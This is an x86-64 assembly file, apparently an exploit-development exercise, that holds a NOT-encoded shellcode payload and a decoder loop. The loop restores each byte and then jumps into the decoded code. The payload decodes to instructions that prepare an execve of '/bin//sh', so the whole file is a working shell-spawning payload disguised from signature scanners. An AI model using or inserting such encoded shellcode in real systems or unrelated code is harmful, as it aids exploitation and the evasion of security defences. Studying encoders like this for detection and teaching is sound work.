 section .text
	global _start
_start:
	jmp real_start

	encoded_shellcode: db 0xb7, 0xce, 0x3f, 0xaf, 0xb7, 0x44, 0xd0, 0x9d, 0x96, 0x91, 0xd0, 0xd0, 0x8c, 0x97, 0xac, 0xb7, 0x76, 0x18, 0xaf, 0xb7, 0x76, 0x1d, 0xa8, 0xb7, 0x76, 0x19, 0xb7, 0x7c, 0x3f, 0xc4, 0xf0, 0xfa

real_start:
	lea rsi, [rel encoded_shellcode]

decoder:
	xor rcx, rcx
	add cl, 32

decode:
	not byte [rsi]
	inc rsi
	loop decode

	jmp short encoded_shellcode